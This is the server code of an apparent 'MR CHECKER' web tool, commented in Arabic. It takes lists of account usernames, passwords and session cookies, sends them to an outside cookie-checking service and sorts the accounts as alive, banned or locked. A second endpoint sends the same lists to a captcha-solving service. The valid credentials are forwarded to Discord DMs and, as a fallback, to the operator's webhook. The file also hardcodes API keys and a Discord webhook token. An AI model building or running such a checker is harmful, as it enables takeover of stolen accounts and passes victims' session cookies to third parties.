require('dotenv').config();
const express = require('express');
const cors = require('cors');
const axios = require('axios');
const rateLimit = require('express-rate-limit');
const helmet = require('helmet');
const path = require('path');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 5000;

// ========== CONFIG - تقدر تعدلها من قائمة الادمن في الموقع ==========
let ZEROPOINT_API_KEY = process.env.ZEROPOINT_API_KEY || 'ZP_CookieChecker_Xn4F7AsMGgB7u73FFFxSF7tPojOvS5f2';
let ZEROSOLVER_API_KEY = process.env.ZEROSOLVER_API_KEY || 'ZP_ZeroSolver_GTtsUCpLGapMdHopCSVrMe0AbGe5Zih4';
let DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL || 'https://discord.com/api/webhooks/1541445184976330813/H8sHiu5UZ7qSqET7fq9od4AkqCIMtaqWbu6YOdHnL9IsrHwyQ0y6YCpwbCx7y02852Ul';
const SESSION_SECRET = process.env.SESSION_SECRET || 'mr-checker-secret-change-me';
let DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID || '1520933782667001856';
let DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET || '';
let DISCORD_REDIRECT_URI = process.env.DISCORD_REDIRECT_URI || `http://localhost:${PORT}/auth/discord/callback`;
let BOT_TOKEN = process.env.BOT_TOKEN || process.env.DISCORD_BOT_TOKEN || '';
let ADMIN_IDS = (process.env.ADMIN_IDS || '1520933782667001856').split(',').map(s=>s.trim()).filter(Boolean);

// تحميل config محفوظ من الادمن (لو موجود)
const CONFIG_PATH = path.join(__dirname, 'config.json');
try {
    if (fs.existsSync(CONFIG_PATH)) {
        const saved = JSON.parse(fs.readFileSync(CONFIG_PATH,'utf8'));
        if (saved.ZEROPOINT_API_KEY) ZEROPOINT_API_KEY = saved.ZEROPOINT_API_KEY;
        if (saved.ZEROSOLVER_API_KEY) ZEROSOLVER_API_KEY = saved.ZEROSOLVER_API_KEY;
        if (saved.DISCORD_WEBHOOK_URL) DISCORD_WEBHOOK_URL = saved.DISCORD_WEBHOOK_URL;
        if (saved.DISCORD_CLIENT_SECRET) { DISCORD_CLIENT_SECRET = saved.DISCORD_CLIENT_SECRET; process.env.DISCORD_CLIENT_SECRET = saved.DISCORD_CLIENT_SECRET; }
        if (saved.ADMIN_IDS) ADMIN_IDS = saved.ADMIN_IDS;
        if (saved.BOT_TOKEN) BOT_TOKEN = saved.BOT_TOKEN;
        console.log('📂 تم تحميل config.json');
    }
    // جرب تحميل من bot/.env لو ما لقى
    if (!BOT_TOKEN) {
        try {
            const botEnvPath = path.join(__dirname, 'bot', '.env');
            if (fs.existsSync(botEnvPath)) {
                const botEnv = fs.readFileSync(botEnvPath,'utf8');
                const m = botEnv.match(/BOT_TOKEN\s*=\s*(.+)/);
                if (m && m[1].trim()) BOT_TOKEN = m[1].trim();
            }
        } catch(e){}
    }
    if (BOT_TOKEN) console.log('🤖 BOT_TOKEN محمل');
    else console.warn('⚠️ BOT_TOKEN غير موجود — الخاص لن يرسل');
} catch(e){ console.warn('config load failed', e.message); }

function saveConfig(obj){
    try { fs.writeFileSync(CONFIG_PATH, JSON.stringify(obj, null, 2)); } catch(e){ console.error('save config failed', e.message); }
    // حاول تحديث bot/.env أيضاً
    try {
        const botEnv = path.join(__dirname, 'bot', '.env');
        if (fs.existsSync(path.join(__dirname, 'bot'))) {
            let content = fs.existsSync(botEnv) ? fs.readFileSync(botEnv,'utf8') : '';
            if (obj.BOT_TOKEN) {
                if (content.includes('BOT_TOKEN=')) content = content.replace(/BOT_TOKEN=.*/,'BOT_TOKEN='+obj.BOT_TOKEN);
                else content += '\nBOT_TOKEN='+obj.BOT_TOKEN;
            }
            if (obj.DISCORD_WEBHOOK_URL) {
                if (content.includes('WEBHOOK_URL=')) content = content.replace(/WEBHOOK_URL=.*/,'WEBHOOK_URL='+obj.DISCORD_WEBHOOK_URL);
                else content += '\nWEBHOOK_URL='+obj.DISCORD_WEBHOOK_URL;
            }
            fs.writeFileSync(botEnv, content);
        }
    } catch(e){}
}

function isAdminUser(user){ if(!user||!user.id) return false; if(!ADMIN_IDS.length) return false; return ADMIN_IDS.includes(String(user.id)); }

async function sendDM(userId, embed, fileContent, filename) {
    if (!BOT_TOKEN) { console.warn('[DM] BOT_TOKEN missing'); return false; }
    if (!userId) return false;
    try {
        const dmRes = await axios.post('https://discord.com/api/users/@me/channels', { recipient_id: String(userId) }, { headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' }, timeout: 10000 });
        const channelId = dmRes.data?.id;
        if (!channelId) return false;
        if (fileContent) {
            const form = new FormData();
            form.append('payload_json', JSON.stringify({ embeds: [embed] }));
            const blob = new Blob([fileContent], { type: 'text/plain' });
            form.append('file', blob, filename || 'salim.txt');
            await axios.post(`https://discord.com/api/channels/${channelId}/messages`, form, { headers: { Authorization: `Bot ${BOT_TOKEN}` }, timeout: 15000 });
        } else {
            await axios.post(`https://discord.com/api/channels/${channelId}/messages`, { embeds: [embed] }, { headers: { Authorization: `Bot ${BOT_TOKEN}`, 'Content-Type': 'application/json' }, timeout: 10000 });
        }
        return true;
    } catch(e){ console.error('[DM] failed:', e.response?.data || e.message); return false; }
}
const userHistoryStore = new Map();
function addUserHistory(userId, entry){
    if(!userId) return;
    if(!userHistoryStore.has(userId)) userHistoryStore.set(userId, []);
    const arr=userHistoryStore.get(userId);
    arr.unshift(entry);
    if(arr.length>100) arr.splice(100);
    try{ const file=require('path').join(__dirname,'user_history.json'); const obj=Object.fromEntries(userHistoryStore); require('fs').writeFileSync(file, JSON.stringify(obj,null,2)); }catch(e){}
}
function getUserHistory(userId){ return userHistoryStore.get(userId)||[]; }
try{
    const file=require('path').join(__dirname,'user_history.json');
    if(require('fs').existsSync(file)){
        const obj=JSON.parse(require('fs').readFileSync(file,'utf8'));
        for(const [k,v] of Object.entries(obj)) userHistoryStore.set(k,v);
        console.log('📂 Loaded per-user history for', userHistoryStore.size, 'users');
    }
}catch(e){}
function requireLogin(req,res,next){ if(!req.session.user) return res.status(401).json({ status:'error', message:'يجب تسجيل الدخول بالديسكورد أولاً' }); next(); }

// ========== MIDDLEWARE ==========
app.use(helmet({
    contentSecurityPolicy: {
        directives: {
            defaultSrc: ["'self'"],
            styleSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com", "fonts.googleapis.com"],
            scriptSrc: ["'self'", "'unsafe-inline'", "cdnjs.cloudflare.com"],
            imgSrc: ["'self'", "data:", "cdn.discordapp.com", "avatars.githubusercontent.com"],
            fontSrc: ["'self'", "fonts.gstatic.com", "cdnjs.cloudflare.com", "data:"],
            connectSrc: ["'self'", "discord.com"],
        },
    },
    frameguard: { action: 'deny' }, noSniff: true, xssFilter: true,
}));
app.use(cors({ origin: true, credentials: true }));
app.use(cookieParser());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));
app.use(session({
    secret: SESSION_SECRET, resave: false, saveUninitialized: false,
    cookie: { httpOnly: true, secure: false, maxAge: 1000*60*60*24*7, sameSite: 'lax' }
}));

// Rate limiting
const apiLimiter = rateLimit({ windowMs: 60*1000, max: 60, message: { error: 'Too many requests' } });
const submitLimiter = rateLimit({ windowMs: 20*1000, max: 1, message: { error: 'Rate limited 20s' } });

// ===== Discord Webhook Helpers =====
async function sendWebhook({ title, description, color, fields, username, webhookUrl, components, thumbnail }) {
    const url = webhookUrl || DISCORD_WEBHOOK_URL;
    if (!url) return;
    try {
        const payload = {
            username: username || 'MR CHECKER',
            avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png',
            embeds: [{ title: title||'MR CHECKER', description: description||'', color: color||0x8b5cf6, fields: fields||[], timestamp: new Date().toISOString(), footer: { text: 'MR CHECKER • mr.cartier.gg' }, thumbnail: thumbnail?{url:thumbnail}:undefined }]
        };
        if (components) payload.components = components;
        await axios.post(url, payload, { timeout: 8000 });
    } catch(e){ console.error('[Webhook]', e.message); }
}
async function sendWebhookWithFile(webhookUrl, embed, fileContent, filename){
    if (!webhookUrl) webhookUrl = DISCORD_WEBHOOK_URL;
    if (!webhookUrl) return;
    try {
        const form = new FormData();
        form.append('payload_json', JSON.stringify({ username: 'MR CHECKER', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png', embeds: [embed] }));
        const blob = new Blob([fileContent], { type: 'text/plain' });
        form.append('file', blob, filename||'salim.txt');
        await axios.post(webhookUrl, form, { timeout: 15000 });
    } catch(e){
        console.error('[Webhook File]', e.message);
        try{ await sendWebhook({ ...embed, webhookUrl }); }catch(_){}
    }
}

// ========== DISCORD OAUTH - مربوط على الموقع ==========
app.get('/auth/discord', (req,res)=>{
    if (!DISCORD_CLIENT_ID || !DISCORD_CLIENT_SECRET) {
        return res.status(500).send(`<html dir="rtl" style="font-family:Tajawal,system-ui;background:#09090b;color:#e5e7eb;padding:40px"><h2 style="color:#f87171">Discord OAuth غير مُعد</h2><p>ضع في .env:</p><pre style="background:#1a1a1e;padding:12px;border-radius:8px">DISCORD_CLIENT_ID=1520933782667001856
DISCORD_CLIENT_SECRET=ضع_السيكرت_هنا
DISCORD_REDIRECT_URI=http://localhost:${PORT}/auth/discord/callback
ADMIN_IDS=1520933782667001856</pre><p>جيب السيكرت من https://discord.com/developers/applications → OAuth2 → Client Secret</p><a href="/" style="color:#8b5cf6">عودة</a></html>`);
    }
    const url = `https://discord.com/api/oauth2/authorize?client_id=${DISCORD_CLIENT_ID}&redirect_uri=${encodeURIComponent(DISCORD_REDIRECT_URI)}&response_type=code&scope=identify%20email`;
    res.redirect(url);
});
app.get('/auth/discord/callback', async (req,res)=>{
    const code = req.query.code;
    if (!code) return res.status(400).send('No code');
    try {
        const tokenRes = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
            client_id: DISCORD_CLIENT_ID, client_secret: DISCORD_CLIENT_SECRET, grant_type: 'authorization_code', code: String(code), redirect_uri: DISCORD_REDIRECT_URI, scope: 'identify email'
        }), { headers: {'Content-Type':'application/x-www-form-urlencoded'} });
        const accessToken = tokenRes.data.access_token;
        const userRes = await axios.get('https://discord.com/api/users/@me', { headers: { Authorization: `Bearer ${accessToken}` } });
        const user = userRes.data;
        const tempUser = { id: String(user.id), username: user.username, discriminator: user.discriminator, avatar: user.avatar?`https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png`:null, email: user.email||null, global_name: user.global_name||user.username };
        req.session.user = tempUser; req.session.isAdmin = isAdminUser(tempUser);
        res.redirect('/');
    } catch(err){
        console.error('[OAuth]', err.response?.data||err.message);
        res.status(500).send(`<h3>OAuth failed</h3><pre>${JSON.stringify(err.response?.data||err.message,null,2)}</pre><a href="/">Back</a>`);
    }
});
app.get('/api/me', (req,res)=>{
    if (!req.session.user) return res.json({ authenticated:false, user:null, isAdmin:false });
    res.json({ authenticated:true, user:req.session.user, isAdmin: !!req.session.isAdmin });
});
app.post('/api/logout', (req,res)=>{ req.session.destroy(()=>{ res.clearCookie('connect.sid'); res.json({ok:true}); }); });

function requireAdmin(req,res,next){ if(!req.session.user||!req.session.isAdmin) return res.status(403).json({error:'Admin only'}); next(); }

// ===== Admin Config API - تعديل التوكنات من قائمة الادمن =====
app.get('/api/admin/config', requireAdmin, (req,res)=>{
    res.json({
        ZEROPOINT_API_KEY: ZEROPOINT_API_KEY ? ZEROPOINT_API_KEY.slice(0,8)+'...'+ZEROPOINT_API_KEY.slice(-4) : '',
        ZEROSOLVER_API_KEY: ZEROSOLVER_API_KEY ? ZEROSOLVER_API_KEY.slice(0,8)+'...'+ZEROSOLVER_API_KEY.slice(-4) : '',
        DISCORD_WEBHOOK_URL: DISCORD_WEBHOOK_URL || '',
        DISCORD_CLIENT_ID, DISCORD_REDIRECT_URI, ADMIN_IDS,
        hasClientSecret: !!DISCORD_CLIENT_SECRET
    });
});
app.post('/api/admin/config', requireAdmin, (req,res)=>{
    const { ZEROPOINT_API_KEY: zp, ZEROSOLVER_API_KEY: zs, DISCORD_WEBHOOK_URL: wh, DISCORD_CLIENT_SECRET: cs, ADMIN_IDS: aids, BOT_TOKEN } = req.body;
    const updated = {};
    if (typeof zp === 'string' && zp.trim()) { ZEROPOINT_API_KEY = zp.trim(); updated.ZEROPOINT_API_KEY = zp.trim(); }
    if (typeof zs === 'string' && zs.trim()) { ZEROSOLVER_API_KEY = zs.trim(); updated.ZEROSOLVER_API_KEY = zs.trim(); }
    if (typeof wh === 'string' && wh.trim()) { DISCORD_WEBHOOK_URL = wh.trim(); updated.DISCORD_WEBHOOK_URL = wh.trim(); }
    if (typeof cs === 'string' && cs.trim()) { DISCORD_CLIENT_SECRET = cs.trim(); process.env.DISCORD_CLIENT_SECRET = cs.trim(); updated.DISCORD_CLIENT_SECRET = cs.trim(); }
    if (typeof aids === 'string') { ADMIN_IDS = aids.split(',').map(s=>s.trim()).filter(Boolean); updated.ADMIN_IDS = ADMIN_IDS; }
    else if (Array.isArray(aids)) { ADMIN_IDS = aids.map(String); updated.ADMIN_IDS = ADMIN_IDS; }
    if (BOT_TOKEN && typeof BOT_TOKEN === 'string' && BOT_TOKEN.trim()) updated.BOT_TOKEN = BOT_TOKEN.trim();
    // احفظ
    try {
        const cur = fs.existsSync(CONFIG_PATH) ? JSON.parse(fs.readFileSync(CONFIG_PATH,'utf8')) : {};
        saveConfig({ ...cur, ...updated });
    } catch(e){}
    res.json({ ok:true, saved: Object.keys(updated) });
});

app.get('/api/admin/stats', requireAdmin, (req,res)=>{
    res.json({ admin:req.session.user, serverTime:new Date().toISOString(), zeroPointKeySet:!!ZEROPOINT_API_KEY, zeroSolverKeySet:!!ZEROSOLVER_API_KEY, discordConfigured:!!(DISCORD_CLIENT_ID&&DISCORD_CLIENT_SECRET), webhookSet:!!DISCORD_WEBHOOK_URL });
});

// ========== ZeroSolver helpers ==========
async function checkSolverCredits(){
    try{
        const r=await axios.get('https://zeropoint.to/api/zerosolver-api/credits',{headers:{'X-API-Key':ZEROSOLVER_API_KEY},timeout:10000});
        return {success:true, balance:r.data?.balance||0, data:r.data};
    }catch(e){ return {success:false, error:e.message}; }
}
async function submitSolverJob(accounts, captchaType){
    try{
        const payload={ accounts: accounts.join('\n') };
        if(captchaType) payload.captcha_type=captchaType;
        const r=await axios.post('https://zeropoint.to/api/zerosolver-api/submit', payload,{headers:{'X-API-Key':ZEROSOLVER_API_KEY,'Content-Type':'application/json'},timeout:30000});
        return {success:true, jobId:r.data?.job_id||null, data:r.data};
    }catch(e){
        let msg=e.message, code=500;
        if(e.response){code=e.response.status; msg=e.response.data?.error||e.response.data?.message||msg; if(code===401) msg='❌ مفتاح ZeroSolver غير صحيح'; else if(code===402) msg='❌ رصيد غير كافٍ';}
        return {success:false, error:msg, statusCode:code};
    }
}
async function getSolverJobStatus(jobId){
    try{const r=await axios.get(`https://zeropoint.to/api/zerosolver-api/status/${jobId}`,{headers:{'X-API-Key':ZEROSOLVER_API_KEY},timeout:10000}); return {success:true, ...r.data, data:r.data};}catch(e){return {success:false,error:e.message};}
}
async function downloadSolverResult(jobId, filename){
    try{const r=await axios.get(`https://zeropoint.to/api/zerosolver-api/download/${jobId}/${filename}`,{headers:{'X-API-Key':ZEROSOLVER_API_KEY},timeout:15000,responseType:'text'}); return {success:true,data:r.data};}catch(e){return {success:false,error:e.message};}
}

// ========== API ENDPOINTS ==========
app.post('/api/check', apiLimiter, submitLimiter, requireLogin, async (req, res) => {
    const { accounts } = req.body;
    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) return res.status(400).json({ status: 'error', message: 'No accounts' });
    try {
        let allResults=[]; let totalAlive=0,totalDead=0,totalBanned=0,totalFacelock=0,totalCaptcha=0;
        const batchSize=100; const batches=[]; for(let i=0;i<accounts.length;i+=batchSize) batches.push(accounts.slice(i,i+batchSize));
        for(let b=0;b<batches.length;b++){
            const batch=batches[b];
            const cookieLines=batch.map(function(acc){ if(acc.cookie) return (acc.username||'unknown')+':'+(acc.password||'')+':'+acc.cookie; return acc.raw||''; }).filter(function(line){return line.trim();});
            if(!cookieLines.length) continue;
            const cookiesText=cookieLines.join('\n');
            const response=await axios.post('https://zeropoint.to/api/cookie-checker-api/submit',{cookies:cookiesText},{headers:{'X-API-Key':ZEROPOINT_API_KEY,'Content-Type':'application/json'},timeout:60000});
            const sessionId=response.data?.session_id; if(!sessionId) continue;
            let statusResult; let attempts=0; const maxAttempts=60;
            while(attempts<maxAttempts){
                await new Promise(function(resolve){setTimeout(resolve,2000);});
                const statusResponse=await axios.get(`https://zeropoint.to/api/cookie-checker-api/status/${sessionId}`,{headers:{'X-API-Key':ZEROPOINT_API_KEY},timeout:10000});
                statusResult=statusResponse.data;
                if(statusResult?.status==='completed'||statusResult?.status==='error') break;
                attempts++;
            }
            if(!statusResult||statusResult.status!=='completed') continue;
            const resultTypes=['alive','dead','face_lock','captcha_lock','ban_warn']; const downloadedResults={};
            for(var i=0;i<resultTypes.length;i++){
                var type=resultTypes[i];
                try{
                    const downloadResponse=await axios.get(`https://zeropoint.to/api/cookie-checker-api/download/${sessionId}/${type}`,{headers:{'X-API-Key':ZEROPOINT_API_KEY},timeout:15000,responseType:'text'});
                    if(downloadResponse.data) downloadedResults[type]=downloadResponse.data.split('\n').filter(function(line){return line.trim();});
                }catch(e){}
            }
            for(var typeKey in downloadedResults){
                if(downloadedResults.hasOwnProperty(typeKey)){
                    var lines=downloadedResults[typeKey];
                    for(var j=0;j<lines.length;j++){
                        var line=lines[j]; var username='unknown'; var cookie=''; var parts=line.split(':'); if(parts.length>=1) username=parts[0]; if(parts.length>=3) cookie=parts.slice(2).join(':'); var status='dead';
                        if(typeKey==='alive'){status='alive';totalAlive++;} else if(typeKey==='face_lock'){status='facelock';totalFacelock++;} else if(typeKey==='captcha_lock'){status='captcha';totalCaptcha++;} else if(typeKey==='ban_warn'){status='banned';totalBanned++;} else {totalDead++;}
                        allResults.push({username,status,cookie,raw:line});
                    }
                }
            }
            if(b<batches.length-1) await new Promise(function(resolve){setTimeout(resolve,1000);});
        }
        if(allResults.length===0){
            for(var k=0;k<accounts.length;k++){ var acc=accounts[k]; allResults.push({username:acc.username||'unknown',status:'dead',cookie:acc.cookie||'',raw:acc.raw||''}); totalDead++; }
        }
        // حفظ سجل لكل حساب ديسكورد يسجل دخول
        try { addUserHistory(req.session.user.id, { date: new Date().toISOString(), total: accounts.length, alive: totalAlive, dead: totalDead, banned: totalBanned, facelock: totalFacelock, captcha: totalCaptcha, accounts: accounts.slice(0,20), results: allResults.slice(0,20) }); } catch(e){}
        // إرسال للخاص فقط (بدون ويب هوك بروم)
        try {
            const userId = req.session.user.id;
            const aliveContent2 = allResults.filter(function(r){return r.status==='alive';}).map(function(r){return r.raw;}).join('\n');
            const embedStats2 = { title: '🔍 نتيجة فحص حسابات', description: 'فحصنا **' + accounts.length + '** حساب', color: totalAlive>0?0x22c55e:0xef4444, fields: [{name:'✅ سليم',value:String(totalAlive),inline:true},{name:'❌ ميت',value:String(totalDead),inline:true},{name:'⛔ محظور',value:String(totalBanned),inline:true},{name:'🔒 مقفل',value:String(totalFacelock),inline:true},{name:'🤖 كابتشا',value:String(totalCaptcha),inline:true}], footer:{text:'MR CHECKER'}, timestamp: new Date().toISOString() };
            let dmOk=false;
            if (totalAlive>0) dmOk = await sendDM(userId, embedStats2, aliveContent2, 'salim.txt');
            else dmOk = await sendDM(userId, embedStats2, null, null);
            if (!dmOk) {
                // fallback: أرسل للويب هوك العام لو الخاص مقفل
                try {
                    if (totalAlive>0) await sendWebhookWithFile(null, embedStats2, aliveContent2, 'salim.txt');
                    else await sendWebhook(embedStats2);
                } catch(e){}
            }
        } catch(e){ console.error('[DM Check]', e.message); }
        res.json({ status:'completed', total:accounts.length, aliveCount:totalAlive, deadCount:totalDead, bannedCount:totalBanned, faceLockCount:totalFacelock, captchaLockCount:totalCaptcha, results:allResults });
    } catch(error){ console.error('Check Error:',error); res.status(500).json({status:'error',message:error.message||'حدث خطأ'}); }
});

app.post('/api/solve-captcha', apiLimiter, async (req,res)=>{
    const { accounts, captchaType } = req.body;
    if(!accounts||!Array.isArray(accounts)||!accounts.length) return res.status(400).json({status:'error',message:'No accounts'});
    try{
        const accountLines=accounts.map(function(acc){ if(acc.cookie) return (acc.username||'unknown')+':'+(acc.password||'')+':'+acc.cookie; return acc.raw||''; }).filter(function(line){return line.trim();});
        if(!accountLines.length) return res.status(400).json({status:'error',message:'No valid accounts'});
        const submitResult=await submitSolverJob(accountLines, captchaType);
        if(!submitResult.success) return res.status(submitResult.statusCode||500).json({status:'error',message:submitResult.error});
        const jobId=submitResult.jobId; if(!jobId) return res.status(500).json({status:'error',message:'No job ID'});
        let statusResult; let attempts=0; const maxAttempts=120;
        while(attempts<maxAttempts){ await new Promise(function(resolve){setTimeout(resolve,2000);}); statusResult=await getSolverJobStatus(jobId); if(statusResult.success && (statusResult.status==='completed'||statusResult.status==='failed'||statusResult.status==='cancelled')) break; attempts++; }
        if(!statusResult||!statusResult.success) return res.json({status:'error',message:statusResult?.error||'Failed',jobId});
        const resultFiles=statusResult.resultFiles||[]; const results={solved:[],alreadySolved:[],failed:[]};
        for(var i=0;i<resultFiles.length;i++){ var filename=resultFiles[i]; var dl=await downloadSolverResult(jobId, filename); if(dl.success&&dl.data){ var lines=dl.data.split('\n').filter(function(l){return l.trim();}); if(filename.includes('solved')) results.solved=lines; else if(filename.includes('already_solved')) results.alreadySolved=lines; else if(filename.includes('failed')) results.failed=lines; } }
        sendWebhook({ title:'🤖 حل الكابتشا', description:`تم حل كابتشا لـ **${accountLines.length}** حساب`, color:0xeab308, fields:[{name:'✅ تم الحل',value:String(statusResult.successful||0),inline:true},{name:'❌ فشل',value:String(statusResult.failed||0),inline:true},{name:'📊 الإجمالي',value:String(accountLines.length),inline:true}] });
        res.json({ status:'completed', jobId, totalAccounts:statusResult.totalAccounts||0, processed:statusResult.processed||0, successful:statusResult.successful||0, alreadySolved:statusResult.alreadySolved||0, failed:statusResult.failed||0, results });
    }catch(error){ console.error('Solve Captcha Error:',error); res.status(500).json({status:'error',message:error.message}); }
});
app.get('/api/solver-credits', async (req,res)=>{ const r=await checkSolverCredits(); res.json(r); });
app.get('/api/solver-status/:jobId', async (req,res)=>{ const r=await getSolverJobStatus(req.params.jobId); res.json(r); });
app.get('/api/history', requireLogin, (req,res)=>{
    const h=getUserHistory(req.session.user.id);
    res.json(h);
});
app.delete('/api/history', requireLogin, (req,res)=>{
    userHistoryStore.set(req.session.user.id, []);
    try{ const file=require('path').join(__dirname,'user_history.json'); const obj=Object.fromEntries(userHistoryStore); require('fs').writeFileSync(file, JSON.stringify(obj,null,2)); }catch(e){}
    res.json({ok:true});
});
app.post('/api/add-accounts', apiLimiter, async (req,res)=>{
    const { count, sample } = req.body;
    sendWebhook({ title:'➕ إضافة حسابات', description:`تمت إضافة **${count||0}** حساب جديد`, color:0x8b5cf6, fields: sample?[{name:'عينة',value:String(sample).slice(0,1000)}]:[] });
    res.json({ ok:true });
});

// Serve static
app.use(express.static('public'));
app.get('/', function(req,res){ res.sendFile(path.join(__dirname,'public','index.html')); });

app.listen(PORT, function(){
    console.log('========================================');
    console.log('🔥 MR CHECKER Server running');
    console.log('📍 http://localhost:'+PORT);
    console.log('🔑 ZeroPoint:', ZEROPOINT_API_KEY.slice(0,8)+'...');
    console.log('🔑 ZeroSolver:', ZEROSOLVER_API_KEY.slice(0,8)+'...');
    console.log('🔗 Webhook:', DISCORD_WEBHOOK_URL?'مفعل':'غير مفعل');
    console.log('👑 Admin IDs:', ADMIN_IDS.join(', ')||'لا يوجد');
    if(!DISCORD_CLIENT_SECRET) console.log('⚠️  ضع DISCORD_CLIENT_SECRET في .env أو عدل من صفحة الادمن');
    console.log('========================================');
});
